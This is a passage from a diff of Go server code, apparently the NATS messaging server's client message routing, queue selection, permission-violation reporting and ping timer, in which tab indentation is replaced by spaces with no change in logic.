If the reply subject is a GW routed reply, we will perform some\n-\t// tracking in deliverMsg(). We also want to send to the user the\n-\t// reply without the prefix. `creply` will be set to that and be\n-\t// used to create the message header for client connections.\n-\tif rplyHasGWPrefix = isGWRoutedReply(reply); rplyHasGWPrefix {\n-\t\tcreply = reply[gwSubjectOffset:]\n-\t}\n-\n-\t// With JetStream we now have times where we want to match a subscription\n-\t// on one subject, but deliver it with another. e.g. JetStream deliverables.\n-\t// This only works for last mile, meaning to a client. For other types we need\n-\t// to use the original subject.\n-\tsubj := subject\n-\tif len(deliver) > 0 {\n-\t\tsubj = deliver\n-\t}\n-\n-\t// Check for JetStream encoded reply subjects.\n-\t// For now these will only be on $JS.ACK prefixed reply subjects.\n-\tif len(creply) > 0 &&\n-\t\tc.kind != CLIENT && c.kind != SYSTEM && c.kind != JETSTREAM && c.kind != ACCOUNT &&\n-\t\tbytes.HasPrefix(creply, []byte(jsAckPre)) {\n-\t\t// We need to rewrite the subject and the reply.\n-\t\tif li := bytes.LastIndex(creply, []byte(\"@\")); li != -1 && li < len(creply)-1 {\n-\t\t\tsubj, creply = creply[li+1:], creply[:li]\n-\t\t}\n-\t}\n-\n-\tvar didDeliver bool\n-\n-\t// delivery subject for clients\n-\tvar dsubj []byte\n-\t// Used as scratch if mapping\n-\tvar _dsubj [64]byte\n-\n-\t// Loop over all normal subscriptions that match.\n-\tfor _, sub := range r.psubs {\n-\t\t// Check if this is a send to a ROUTER. We now process\n-\t\t// these after everything else.\n-\t\tswitch sub.client.kind {\n-\t\tcase ROUTER:\n-\t\t\tif (c.kind != ROUTER && !c.isSpokeLeafNode()) || (flags&pmrAllowSendFromRouteToRoute != 0) {\n-\t\t\t\tc.addSubToRouteTargets(sub)\n-\t\t\t}\n-\t\t\tcontinue\n-\t\tcase GATEWAY:\n-\t\t\t// Never send to gateway from here.\n-\t\t\tcontinue\n-\t\tcase LEAF:\n-\t\t\t// We handle similarly to routes and use the same data structures.\n-\t\t\t// Leaf node delivery audience is different however.\n-\t\t\t// Also leaf nodes are always no echo, so we make sure we are not\n-\t\t\t// going to send back to ourselves here. For messages from routes we want\n-\t\t\t// to suppress in general unless we know from the hub or its a service reply.\n-\t\t\tif c != sub.client && (c.kind != ROUTER || sub.client.isHubLeafNode() || isServiceReply(c.pa.subject)) {\n-\t\t\t\tc.addSubToRouteTargets(sub)\n-\t\t\t}\n-\t\t\tcontinue\n-\t\t}\n-\n-\t\t// Assume delivery subject is the normal subject to this point.\n-\t\tdsubj = subj\n-\n-\t\t// Check for stream import mapped subs (shadow subs). These apply to local subs only.\n-\t\tif sub.im != nil {\n-\t\t\t// If this message was a service import do not re-export to an exported stream.\n-\t\t\tif flags&pmrMsgImportedFromService != 0 {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\t\t\tif sub.im.tr != nil {\n-\t\t\t\tto, _ := sub.im.tr.transformSubject(string(dsubj))\n-\t\t\t\tdsubj = append(_dsubj[:0], to...)\n-\t\t\t} else if sub.im.usePub {\n-\t\t\t\tdsubj = append(_dsubj[:0], subj...)\n-\t\t\t} else {\n-\t\t\t\tdsubj = append(_dsubj[:0], sub.im.to...)\n-\t\t\t}\n-\t\t\t// If we are mapping for a deliver subject we will reverse roles.\n-\t\t\t// The original subj we set from above is correct for the msg header,\n-\t\t\t// but we need to transform the deliver subject to properly route.\n-\t\t\tif len(deliver) > 0 {\n-\t\t\t\tdsubj, subj = subj, dsubj\n-\t\t\t}\n-\t\t}\n-\n-\t\t// Remap to the original subject if internal.\n-\t\tif sub.icb != nil && sub.rsi {\n-\t\t\tdsubj = subject\n-\t\t}\n-\n-\t\t// Normal delivery\n-\t\tmh := c.msgHeader(dsubj, creply, sub)\n-\t\tdidDeliver = c.deliverMsg(sub, acc, dsubj, creply, mh, msg, rplyHasGWPrefix) || didDeliver\n-\t}\n-\n-\t// Set these up to optionally filter based on the queue lists.\n-\t// This is for messages received from routes which will have directed\n-\t// guidance on which queue groups we should deliver to.\n-\tqf := c.pa.queues\n-\n-\t// Declared here because of goto.\n-\tvar queues [][]byte\n-\n-\t// For all routes/leaf/gateway connections, we may still want to send messages to\n-\t// leaf nodes or routes even if there are no queue filters since we collect\n-\t// them above and do not process inline like normal clients.\n-\t// However, do select queue subs if asked to ignore empty queue filter.\n-\tif (c.kind == LEAF || c.kind == ROUTER || c.kind == GATEWAY) && qf == nil && flags&pmrIgnoreEmptyQueueFilter == 0 {\n-\t\tgoto sendToRoutesOrLeafs\n-\t}\n-\n-\t// Check to see if we have our own rand yet. Global rand\n-\t// has contention with lots of clients, etc.\n-\tif c.in.prand == nil {\n-\t\tc.in.prand = rand.New(rand.NewSource(time.Now().UnixNano()))\n-\t}\n-\n-\t// Process queue subs\n-\tfor i := 0; i < len(r.qsubs); i++ {\n-\t\tqsubs := r.qsubs[i]\n-\t\t// If we have a filter check that here. We could make this a map or someting more\n-\t\t// complex but linear search since we expect queues to be small. Should be faster\n-\t\t// and more cache friendly.\n-\t\tif qf != nil && len(qsubs) > 0 {\n-\t\t\ttqn := qsubs[0].queue\n-\t\t\tfor _, qn := range qf {\n-\t\t\t\tif bytes.Equal(qn, tqn) {\n-\t\t\t\t\tgoto selectQSub\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tcontinue\n-\t\t}\n-\n-\tselectQSub:\n-\t\t// We will hold onto remote or lead qsubs when we are coming from\n-\t\t// a route or a leaf node just in case we can no longer do local delivery.\n-\t\tvar rsub, sub *subscription\n-\t\tvar _ql [32]*subscription\n-\n-\t\tsrc := c.kind\n-\t\t// If we just came from a route we want to prefer local subs.\n-\t\t// So only select from local subs but remember the first rsub\n-\t\t// in case all else fails.\n-\t\tif src == ROUTER {\n-\t\t\tql := _ql[:0]\n-\t\t\tfor i := 0; i < len(qsubs); i++ {\n-\t\t\t\tsub = qsubs[i]\n-\t\t\t\tif sub.client.kind == LEAF || sub.client.kind == ROUTER {\n-\t\t\t\t\t// If we have assigned an rsub already, replace if the destination is a LEAF\n-\t\t\t\t\t// since we want to favor that compared to a ROUTER. We could make sure that\n-\t\t\t\t\t// we override only if previous was a ROUTE and not a LEAF, but we don't have to.\n-\t\t\t\t\tif rsub == nil || sub.client.kind == LEAF {\n-\t\t\t\t\t\trsub = sub\n-\t\t\t\t\t}\n-\t\t\t\t} else {\n-\t\t\t\t\tql = append(ql, sub)\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\tqsubs = ql\n-\t\t}\n-\n-\t\tsindex := 0\n-\t\tlqs := len(qsubs)\n-\t\tif lqs > 1 {\n-\t\t\tsindex = c.in.prand.Int() % lqs\n-\t\t}\n-\n-\t\t// Find a subscription that is able to deliver this message starting at a random index.\n-\t\tfor i := 0; i < lqs; i++ {\n-\t\t\tif sindex+i < lqs {\n-\t\t\t\tsub = qsubs[sindex+i]\n-\t\t\t} else {\n-\t\t\t\tsub = qsubs[(sindex+i)%lqs]\n-\t\t\t}\n-\t\t\tif sub == nil {\n-\t\t\t\tcontinue\n-\t\t\t}\n-\n-\t\t\t// We have taken care of preferring local subs for a message from a route above.\n-\t\t\t// Here we just care about a client or leaf and skipping a leaf and preferring locals.\n-\t\t\tif dst := sub.client.kind; dst == ROUTER || dst == LEAF {\n-\t\t\t\tif (src == LEAF || src == CLIENT) && dst == LEAF {\n-\t\t\t\t\tif rsub == nil {\n-\t\t\t\t\t\trsub = sub\n-\t\t\t\t\t}\n-\t\t\t\t\tcontinue\n-\t\t\t\t} else {\n-\t\t\t\t\tc.addSubToRouteTargets(sub)\n-\t\t\t\t\t// Clear rsub since we added a sub.\n-\t\t\t\t\trsub = nil\n-\t\t\t\t\tif flags&pmrCollectQueueNames != 0 {\n-\t\t\t\t\t\tqueues = append(queues, sub.queue)\n-\t\t\t\t\t}\n-\t\t\t\t}\n-\t\t\t\tbreak\n-\t\t\t}\n-\n-\t\t\t// Assume delivery subject is normal subject to this point.\n-\t\t\tdsubj = subj\n-\t\t\t// Check for stream import mapped subs. These apply to local subs only.\n-\t\t\tif sub.im != nil {\n-\t\t\t\t// If this message was a service import do not re-export to an exported stream.\n-\t\t\t\tif flags&pmrMsgImportedFromService != 0 {\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t\tif sub.im.tr != nil {\n-\t\t\t\t\tto, _ := sub.im.tr.transformSubject(string(subj))\n-\t\t\t\t\tdsubj = append(_dsubj[:0], to...)\n-\t\t\t\t} else if sub.im.usePub {\n-\t\t\t\t\tdsubj = append(_dsubj[:0], subj...)\n-\t\t\t\t} else {\n-\t\t\t\t\tdsubj = append(_dsubj[:0], sub.im.to...)\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\tmh := c.msgHeader(dsubj, creply, sub)\n-\t\t\tif c.deliverMsg(sub, acc, subject, creply, mh, msg, rplyHasGWPrefix) {\n-\t\t\t\tdidDeliver = true\n-\t\t\t\t// Clear rsub\n-\t\t\t\trsub = nil\n-\t\t\t\tif flags&pmrCollectQueueNames != 0 {\n-\t\t\t\t\tqueues = append(queues, sub.queue)\n-\t\t\t\t}\n-\t\t\t\tbreak\n-\t\t\t}\n-\t\t}\n-\n-\t\tif rsub != nil {\n-\t\t\t// If we are here we tried to deliver to a local qsub\n-\t\t\t// but failed. So we will send it to a remote or leaf node.\n-\t\t\tc.addSubToRouteTargets(rsub)\n-\t\t\tif flags&pmrCollectQueueNames != 0 {\n-\t\t\t\tqueues = append(queues, rsub.queue)\n-\t\t\t}\n-\t\t}\n-\t}\n+        // For sending messages across routes and leafnodes.\n+        // Reset if we have one since we reuse this data structure.\n+        if c.in.rts != nil {\n+                c.in.rts = c.in.rts[:0]\n+        }\n+\n+        var rplyHasGWPrefix bool\n+        var creply = reply\n+\n+        // If the reply subject is a GW routed reply, we will perform some\n+        // tracking in deliverMsg(). We also want to send to the user the\n+        // reply without the prefix. `creply` will be set to that and be\n+        // used to create the message header for client connections.\n+        if rplyHasGWPrefix = isGWRoutedReply(reply); rplyHasGWPrefix {\n+                creply = reply[gwSubjectOffset:]\n+        }\n+\n+        // With JetStream we now have times where we want to match a subscription\n+        // on one subject, but deliver it with another. e.g. JetStream deliverables.\n+        // This only works for last mile, meaning to a client. For other types we need\n+        // to use the original subject.\n+        subj := subject\n+        if len(deliver) > 0 {\n+                subj = deliver\n+        }\n+\n+        // Check for JetStream encoded reply subjects.\n+        // For now these will only be on $JS.ACK prefixed reply subjects.\n+        if len(creply) > 0 &&\n+                c.kind != CLIENT && c.kind != SYSTEM && c.kind != JETSTREAM && c.kind != ACCOUNT &&\n+                bytes.HasPrefix(creply, []byte(jsAckPre)) {\n+                // We need to rewrite the subject and the reply.\n+                if li := bytes.LastIndex(creply, []byte(\"@\")); li != -1 && li < len(creply)-1 {\n+                        subj, creply = creply[li+1:], creply[:li]\n+                }\n+        }\n+\n+        var didDeliver bool\n+\n+        // delivery subject for clients\n+        var dsubj []byte\n+        // Used as scratch if mapping\n+        var _dsubj [64]byte\n+\n+        // Loop over all normal subscriptions that match.\n+        for _, sub := range r.psubs {\n+                // Check if this is a send to a ROUTER. We now process\n+                // these after everything else.\n+                switch sub.client.kind {\n+                case ROUTER:\n+                        if (c.kind != ROUTER && !c.isSpokeLeafNode()) || (flags&pmrAllowSendFromRouteToRoute != 0) {\n+                                c.addSubToRouteTargets(sub)\n+                        }\n+                        continue\n+                case GATEWAY:\n+                        // Never send to gateway from here.\n+                        continue\n+                case LEAF:\n+                        // We handle similarly to routes and use the same data structures.\n+                        // Leaf node delivery audience is different however.\n+                        // Also leaf nodes are always no echo, so we make sure we are not\n+                        // going to send back to ourselves here. For messages from routes we want\n+                        // to suppress in general unless we know from the hub or its a service reply.\n+                        if c != sub.client && (c.kind != ROUTER || sub.client.isHubLeafNode() || isServiceReply(c.pa.subject)) {\n+                                c.addSubToRouteTargets(sub)\n+                        }\n+                        continue\n+                }\n+\n+                // Assume delivery subject is the normal subject to this point.\n+                dsubj = subj\n+\n+                // Check for stream import mapped subs (shadow subs). These apply to local subs only.\n+                if sub.im != nil {\n+                        // If this message was a service import do not re-export to an exported stream.\n+                        if flags&pmrMsgImportedFromService != 0 {\n+                                continue\n+                        }\n+                        if sub.im.tr != nil {\n+                                to, _ := sub.im.tr.transformSubject(string(dsubj))\n+                                dsubj = append(_dsubj[:0], to...)\n+                        } else if sub.im.usePub {\n+                                dsubj = append(_dsubj[:0], subj...)\n+                        } else {\n+                                dsubj = append(_dsubj[:0], sub.im.to...)\n+                        }\n+                        // If we are mapping for a deliver subject we will reverse roles.\n+                        // The original subj we set from above is correct for the msg header,\n+                        // but we need to transform the deliver subject to properly route.\n+                        if len(deliver) > 0 {\n+                                dsubj, subj = subj, dsubj\n+                        }\n+                }\n+\n+                // Remap to the original subject if internal.\n+                if sub.icb != nil && sub.rsi {\n+                        dsubj = subject\n+                }\n+\n+                // Normal delivery\n+                mh := c.msgHeader(dsubj, creply, sub)\n+                didDeliver = c.deliverMsg(sub, acc, dsubj, creply, mh, msg, rplyHasGWPrefix) || didDeliver\n+        }\n+\n+        // Set these up to optionally filter based on the queue lists.\n+        // This is for messages received from routes which will have directed\n+        // guidance on which queue groups we should deliver to.\n+        qf := c.pa.queues\n+\n+        // Declared here because of goto.\n+        var queues [][]byte\n+\n+        // For all routes/leaf/gateway connections, we may still want to send messages to\n+        // leaf nodes or routes even if there are no queue filters since we collect\n+        // them above and do not process inline like normal clients.\n+        // However, do select queue subs if asked to ignore empty queue filter.\n+        if (c.kind == LEAF || c.kind == ROUTER || c.kind == GATEWAY) && qf == nil && flags&pmrIgnoreEmptyQueueFilter == 0 {\n+                goto sendToRoutesOrLeafs\n+        }\n+\n+        // Check to see if we have our own rand yet. Global rand\n+        // has contention with lots of clients, etc.\n+        if c.in.prand == nil {\n+                c.in.prand = rand.New(rand.NewSource(time.Now().UnixNano()))\n+        }\n+\n+        // Process queue subs\n+        for i := 0; i < len(r.qsubs); i++ {\n+                qsubs := r.qsubs[i]\n+                // If we have a filter check that here. We could make this a map or someting more\n+                // complex but linear search since we expect queues to be small. Should be faster\n+                // and more cache friendly.\n+                if qf != nil && len(qsubs) > 0 {\n+                        tqn := qsubs[0].queue\n+                        for _, qn := range qf {\n+                                if bytes.Equal(qn, tqn) {\n+                                        goto selectQSub\n+                                }\n+                        }\n+                        continue\n+                }\n+\n+        selectQSub:\n+                // We will hold onto remote or lead qsubs when we are coming from\n+                // a route or a leaf node just in case we can no longer do local delivery.\n+                var rsub, sub *subscription\n+                var _ql [32]*subscription\n+\n+                src := c.kind\n+                // If we just came from a route we want to prefer local subs.\n+                // So only select from local subs but remember the first rsub\n+                // in case all else fails.\n+                if src == ROUTER {\n+                        ql := _ql[:0]\n+                        for i := 0; i < len(qsubs); i++ {\n+                                sub = qsubs[i]\n+                                if sub.client.kind == LEAF || sub.client.kind == ROUTER {\n+                                        // If we have assigned an rsub already, replace if the destination is a LEAF\n+                                        // since we want to favor that compared to a ROUTER. We could make sure that\n+                                        // we override only if previous was a ROUTE and not a LEAF, but we don't have to.\n+                                        if rsub == nil || sub.client.kind == LEAF {\n+                                                rsub = sub\n+                                        }\n+                                } else {\n+                                        ql = append(ql, sub)\n+                                }\n+                        }\n+                        qsubs = ql\n+                }\n+\n+                sindex := 0\n+                lqs := len(qsubs)\n+                if lqs > 1 {\n+                        sindex = c.in.prand.Int() % lqs\n+                }\n+\n+                // Find a subscription that is able to deliver this message starting at a random index.\n+                for i := 0; i < lqs; i++ {\n+                        if sindex+i < lqs {\n+                                sub = qsubs[sindex+i]\n+                        } else {\n+                                sub = qsubs[(sindex+i)%lqs]\n+                        }\n+                        if sub == nil {\n+                                continue\n+                        }\n+\n+                        // We have taken care of preferring local subs for a message from a route above.\n+                        // Here we just care about a client or leaf and skipping a leaf and preferring locals.\n+                        if dst := sub.client.kind; dst == ROUTER || dst == LEAF {\n+                                if (src == LEAF || src == CLIENT) && dst == LEAF {\n+                                        if rsub == nil {\n+                                                rsub = sub\n+                                        }\n+                                        continue\n+                                } else {\n+                                        c.addSubToRouteTargets(sub)\n+                                        // Clear rsub since we added a sub.\n+                                        rsub = nil\n+                                        if flags&pmrCollectQueueNames != 0 {\n+                                                queues = append(queues, sub.queue)\n+                                        }\n+                                }\n+                                break\n+                        }\n+\n+                        // Assume delivery subject is normal subject to this point.\n+                        dsubj = subj\n+                        // Check for stream import mapped subs. These apply to local subs only.\n+                        if sub.im != nil {\n+                                // If this message was a service import do not re-export to an exported stream.\n+                                if flags&pmrMsgImportedFromService != 0 {\n+                                        continue\n+                                }\n+                                if sub.im.tr != nil {\n+                                        to, _ := sub.im.tr.transformSubject(string(subj))\n+                                        dsubj = append(_dsubj[:0], to...)\n+                                } else if sub.im.usePub {\n+                                        dsubj = append(_dsubj[:0], subj...)\n+                                } else {\n+                                        dsubj = append(_dsubj[:0], sub.im.to...)\n+                                }\n+                        }\n+\n+                        mh := c.msgHeader(dsubj, creply, sub)\n+                        if c.deliverMsg(sub, acc, subject, creply, mh, msg, rplyHasGWPrefix) {\n+                                didDeliver = true\n+                                // Clear rsub\n+                                rsub = nil\n+                                if flags&pmrCollectQueueNames != 0 {\n+                                        queues = append(queues, sub.queue)\n+                                }\n+                                break\n+                        }\n+                }\n+\n+                if rsub != nil {\n+                        // If we are here we tried to deliver to a local qsub\n+                        // but failed. So we will send it to a remote or leaf node.\n+                        c.addSubToRouteTargets(rsub)\n+                        if flags&pmrCollectQueueNames != 0 {\n+                                queues = append(queues, rsub.queue)\n+                        }\n+                }\n+        }\n \n sendToRoutesOrLeafs:\n \n-\t// If no messages for routes or leafnodes return here.\n-\tif len(c.in.rts) == 0 {\n-\t\treturn didDeliver, queues\n-\t}\n-\n-\t// If we do have a deliver subject we need to do something with it.\n-\t// Again this is when JetStream (but possibly others) wants the system\n-\t// to rewrite the delivered subject. The way we will do that is place it\n-\t// at the end of the reply subject if it exists.\n-\tif len(deliver) > 0 && len(reply) > 0 {\n-\t\treply = append(reply, '@')\n-\t\treply = append(reply, deliver...)\n-\t}\n-\n-\t// Copy off original pa in case it changes.\n-\tpa := c.pa\n-\n-\t// We address by index to avoid struct copy.\n-\t// We have inline structs for memory layout and cache coherency.\n-\tfor i := range c.in.rts {\n-\t\trt := &c.in.rts[i]\n-\t\tdc := rt.sub.client\n-\t\tdmsg, hset := msg, false\n-\n-\t\t// Check if we have an origin cluster set from a leafnode message.\n-\t\t// If so make sure we do not send it back to the same cluster for a different\n-\t\t// leafnode. Cluster wide no echo.\n-\t\tif dc.kind == LEAF {\n-\t\t\t// Check two scenarios. One is inbound from a route (c.pa.origin)\n-\t\t\tif c.kind == ROUTER && len(c.pa.origin) > 0 {\n-\t\t\t\tif string(c.pa.origin) == dc.remoteCluster() {\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t}\n-\t\t\t// The other is leaf to leaf.\n-\t\t\tif c.kind == LEAF {\n-\t\t\t\tsrc, dest := c.remoteCluster(), dc.remoteCluster()\n-\t\t\t\tif src != _EMPTY_ && src == dest {\n-\t\t\t\t\tcontinue\n-\t\t\t\t}\n-\t\t\t}\n-\n-\t\t\t// We need to check if this is a request that has a stamped client information header.\n-\t\t\t// This will contain an account but will represent the account from the leafnode. If\n-\t\t\t// they are not named the same this would cause an account lookup failure trying to\n-\t\t\t// process the request for something like JetStream or other system services that rely\n-\t\t\t// on the client info header. We can just check for reply and the presence of a header\n-\t\t\t// to avoid slow downs for all traffic.\n-\t\t\tif len(c.pa.reply) > 0 && c.pa.hdr >= 0 {\n-\t\t\t\tdmsg, hset = c.checkLeafClientInfoHeader(msg)\n-\t\t\t}\n-\t\t}\n-\n-\t\tmh := c.msgHeaderForRouteOrLeaf(subject, reply, rt, acc)\n-\t\tdidDeliver = c.deliverMsg(rt.sub, acc, subject, reply, mh, dmsg, false) || didDeliver\n-\n-\t\t// If we set the header reset the origin pub args.\n-\t\tif hset {\n-\t\t\tc.pa = pa\n-\t\t}\n-\t}\n-\treturn didDeliver, queues\n+        // If no messages for routes or leafnodes return here.\n+        if len(c.in.rts) == 0 {\n+                return didDeliver, queues\n+        }\n+\n+        // If we do have a deliver subject we need to do something with it.\n+        // Again this is when JetStream (but possibly others) wants the system\n+        // to rewrite the delivered subject. The way we will do that is place it\n+        // at the end of the reply subject if it exists.\n+        if len(deliver) > 0 && len(reply) > 0 {\n+                reply = append(reply, '@')\n+                reply = append(reply, deliver...)\n+        }\n+\n+        // Copy off original pa in case it changes.\n+        pa := c.pa\n+\n+        // We address by index to avoid struct copy.\n+        // We have inline structs for memory layout and cache coherency.\n+        for i := range c.in.rts {\n+                rt := &c.in.rts[i]\n+                dc := rt.sub.client\n+                dmsg, hset := msg, false\n+\n+                // Check if we have an origin cluster set from a leafnode message.\n+                // If so make sure we do not send it back to the same cluster for a different\n+                // leafnode. Cluster wide no echo.\n+                if dc.kind == LEAF {\n+                        // Check two scenarios. One is inbound from a route (c.pa.origin)\n+                        if c.kind == ROUTER && len(c.pa.origin) > 0 {\n+                                if string(c.pa.origin) == dc.remoteCluster() {\n+                                        continue\n+                                }\n+                        }\n+                        // The other is leaf to leaf.\n+                        if c.kind == LEAF {\n+                                src, dest := c.remoteCluster(), dc.remoteCluster()\n+                                if src != _EMPTY_ && src == dest {\n+                                        continue\n+                                }\n+                        }\n+\n+                        // We need to check if this is a request that has a stamped client information header.\n+                        // This will contain an account but will represent the account from the leafnode. If\n+                        // they are not named the same this would cause an account lookup failure trying to\n+                        // process the request for something like JetStream or other system services that rely\n+                        // on the client info header. We can just check for reply and the presence of a header\n+                        // to avoid slow downs for all traffic.\n+                        if len(c.pa.reply) > 0 && c.pa.hdr >= 0 {\n+                                dmsg, hset = c.checkLeafClientInfoHeader(msg)\n+                        }\n+                }\n+\n+                mh := c.msgHeaderForRouteOrLeaf(subject, reply, rt, acc)\n+                didDeliver = c.deliverMsg(rt.sub, acc, subject, reply, mh, dmsg, false) || didDeliver\n+\n+                // If we set the header reset the origin pub args.\n+                if hset {\n+                        c.pa = pa\n+                }\n+        }\n+        return didDeliver, queues\n }\n \n // Check and swap accounts on a client info header destined across a leafnode.\n func (c *client) checkLeafClientInfoHeader(msg []byte) (dmsg []byte, setHdr bool) {\n-\tif c.pa.hdr < 0 || len(msg) < c.pa.hdr {\n-\t\treturn msg, false\n-\t}\n-\tcir := getHeader(ClientInfoHdr, msg[:c.pa.hdr])\n-\tif len(cir) == 0 {\n-\t\treturn msg, false\n-\t}\n-\n-\tdmsg = msg\n-\n-\tvar ci ClientInfo\n-\tif err := json.Unmarshal(cir, &ci); err == nil {\n-\t\tif v, _ := c.srv.leafRemoteAccounts.Load(ci.Account); v != nil {\n-\t\t\tremoteAcc := v.(string)\n-\t\t\tif ci.Account != remoteAcc {\n-\t\t\t\tci.Account = remoteAcc\n-\t\t\t\tif b, _ := json.Marshal(ci); b != nil {\n-\t\t\t\t\tdmsg, setHdr = c.setHeader(ClientInfoHdr, string(b), msg), true\n-\t\t\t\t}\n-\t\t\t}\n-\t\t}\n-\t}\n-\treturn dmsg, setHdr\n+        if c.pa.hdr < 0 || len(msg) < c.pa.hdr {\n+                return msg, false\n+        }\n+        cir := getHeader(ClientInfoHdr, msg[:c.pa.hdr])\n+        if len(cir) == 0 {\n+                return msg, false\n+        }\n+\n+        dmsg = msg\n+\n+        var ci ClientInfo\n+        if err := json.Unmarshal(cir, &ci); err == nil {\n+                if v, _ := c.srv.leafRemoteAccounts.Load(ci.Account); v != nil {\n+                        remoteAcc := v.(string)\n+                        if ci.Account != remoteAcc {\n+                                ci.Account = remoteAcc\n+                                if b, _ := json.Marshal(ci); b != nil {\n+                                        dmsg, setHdr = c.setHeader(ClientInfoHdr, string(b), msg), true\n+                                }\n+                        }\n+                }\n+        }\n+        return dmsg, setHdr\n }\n \n func (c *client) pubPermissionViolation(subject []byte) {\n-\tc.sendErr(fmt.Sprintf(\"Permissions Violation for Publish to %q\", subject))\n-\tc.Errorf(\"Publish Violation - %s, Subject %q\", c.getAuthUser(), subject)\n+        c.sendErr(fmt.Sprintf(\"Permissions Violation for Publish to %q\", subject))\n+        c.Errorf(\"Publish Violation - %s, Subject %q\", c.getAuthUser(), subject)\n }\n \n func (c *client) subPermissionViolation(sub *subscription) {\n-\terrTxt := fmt.Sprintf(\"Permissions Violation for Subscription to %q\", sub.subject)\n-\tlogTxt := fmt.Sprintf(\"Subscription Violation - %s, Subject %q, SID %s\",\n-\t\tc.getAuthUser(), sub.subject, sub.sid)\n+        errTxt := fmt.Sprintf(\"Permissions Violation for Subscription to %q\", sub.subject)\n+        logTxt := fmt.Sprintf(\"Subscription Violation - %s, Subject %q, SID %s\",\n+                c.getAuthUser(), sub.subject, sub.sid)\n \n-\tif sub.queue != nil {\n-\t\terrTxt = fmt.Sprintf(\"Permissions Violation for Subscription to %q using queue %q\", sub.subject, sub.queue)\n-\t\tlogTxt = fmt.Sprintf(\"Subscription Violation - %s, Subject %q, Queue: %q, SID %s\",\n-\t\t\tc.getAuthUser(), sub.subject, sub.queue, sub.sid)\n-\t}\n+        if sub.queue != nil {\n+                errTxt = fmt.Sprintf(\"Permissions Violation for Subscription to %q using queue %q\", sub.subject, sub.queue)\n+                logTxt = fmt.Sprintf(\"Subscription Violation - %s, Subject %q, Queue: %q, SID %s\",\n+                        c.getAuthUser(), sub.subject, sub.queue, sub.sid)\n+        }\n \n-\tc.sendErr(errTxt)\n-\tc.Errorf(logTxt)\n+        c.sendErr(errTxt)\n+        c.Errorf(logTxt)\n }\n \n func (c *client) replySubjectViolation(reply []byte) {\n-\tc.sendErr(fmt.Sprintf(\"Permissions Violation for Publish with Reply of %q\", reply))\n-\tc.Errorf(\"Publish Violation - %s, Reply %q\", c.getAuthUser(), reply)\n+        c.sendErr(fmt.Sprintf(\"Permissions Violation for Publish with Reply of %q\", reply))\n+        c.Errorf(\"Publish Violation - %s, Reply %q\", c.getAuthUser(), reply)\n }\n \n func (c *client) maxTokensViolation(sub *subscription) {\n-\terrTxt := fmt.Sprintf(\"Permissions Violation for Subscription to %q, too many tokens\", sub.subject)\n-\tlogTxt := fmt.Sprintf(\"Subscription Violation Too Many Tokens - %s, Subject %q, SID %s\",\n-\t\tc.getAuthUser(), sub.subject, sub.sid)\n-\tc.sendErr(errTxt)\n-\tc.Errorf(logTxt)\n+        errTxt := fmt.Sprintf(\"Permissions Violation for Subscription to %q, too many tokens\", sub.subject)\n+        logTxt := fmt.Sprintf(\"Subscription Violation Too Many Tokens - %s, Subject %q, SID %s\",\n+                c.getAuthUser(), sub.subject, sub.sid)\n+        c.sendErr(errTxt)\n+        c.Errorf(logTxt)\n }\n \n func (c *client) processPingTimer() {\n-\tc.mu.Lock()\n-\tc.ping.tmr = nil\n-\t// Check if connection is still opened\n-\tif c.isClosed() {\n-\t\tc.mu.Unlock()\n-\t\treturn\n-\t}\n-\n-\tc.Debugf(\"%s Ping Timer\", c.kindString())\n-\n-\tvar sendPing bool\n-\n-\t// If we have had activity within the PingInterval then\n-\t// there is no need to send a ping. This can be client data\n-\t// or if we received a ping from the other side.\n-\tpingInterval := c.srv.getOpts().PingInterval\n-\tif c.kind == GATEWAY {\n-\t\tpingInterval = adjustPingIntervalForGateway(pingInterval)\n-\t\tsendPing = true\n-\t}\n-\tnow := time.Now()\n-\tneedRTT := c.rtt == 0 || now.Sub(c.rttStart) > DEFAULT_RTT_MEASUREMENT_INTERVAL\n-\n-\t// Do not delay PINGs for GATEWAY connections.\n-\tif c.kind != GATEWAY {\n-\t\tif delta := now.Sub(c.last); delta < pingInterval && !needRTT {\n-\t\t\tc.Debugf(\"Delaying PING due to client activity %v ago\", delta.Round(time.Second))\n-\t\t} else if delta := now.Sub(c.ping.last); delta < pingInterval && !needRTT {\n-\t\t\tc.Debugf(\"Delaying PING due to remote ping %v ago\", delta.Round(time.Second))\n-\t\t} else {\n-\t\t\tsendPing = true\n-\t\t}\n-\t}\n-\tif sendPing {\n-\t\t// Check for violation\n-\t\tif c.ping.out+1 > c.srv.getOpts().MaxPingsOut {\n-\t\t\tc.Debugf(\"Stale Client Connection - Closing\")\n-\t\t\tc.enqueueProto([]byte(fmt.Sprintf(errProto, \"Stale Connection\")))\n-\t\t\tc.mu.Unlock()\n-\t\t\tc.closeConnection(StaleConnection)\n-\t\t\treturn\n-\t\t}\n-\t\t// Send PING\n-\t\tc.sendPing()\n-\t}\n-\n-\t// Reset to fire again.\n-\tc.setPingTimer()\n-\tc.mu.Unlock()\n+        c.mu.Lock()\n+        c.ping.tmr = nil\n+        // Check if connection is still opened\n+        if c.isClosed() {\n+                c.mu.Unlock()\n+                return\n+        }\n+\n+        c.Debugf(\"%s Ping Timer\", c.kindString())\n+\n+        var sendPing bool\n+\n+        // If we have had activity within the PingInterval then\n+        // there is no need to send a ping. This can be client data\n+        // or if we received a ping from the other side.\n+        pingInterval := c.srv.getOpts().PingInterval\n+        if c.kind == GATEWAY {\n+                pingInterval = adjustPingIntervalForGateway(pingInterval)\n+                sendPing = true\n+        }\n+        now := time.Now()\n+        needRTT := c.rtt == 0 || now.Sub(c.rttStart) > DEFAULT_RTT_MEASUREMENT_INTERVAL\n+\n+        // Do not delay PINGs for GATEWAY connections.\n+        if c.kind != GATEWAY {\n+                if delta := now.Sub(c.last); delta < pingInterval && !needRTT {\n+                        c.Debugf(\"Delaying PING due to client activity %v ago\", delta.Round(time.Second))\n+                } else if delta := now.Sub(c.ping.last); delta < pingInterval && !needRTT {\n+                        c.Debugf(\"Delaying PING due to remote ping %v ago\", delta.Round(time.Second))\n+                } else {\n+                        sendPing = true\n+                }\n+        }\n+        if sendPing {\n+                // Check for violation\n+                if c.ping.out+1 > c.srv.getOpts().MaxPingsOut {\n+                        c.Debugf(\"Stale Client Connection - Closing\")\n+                        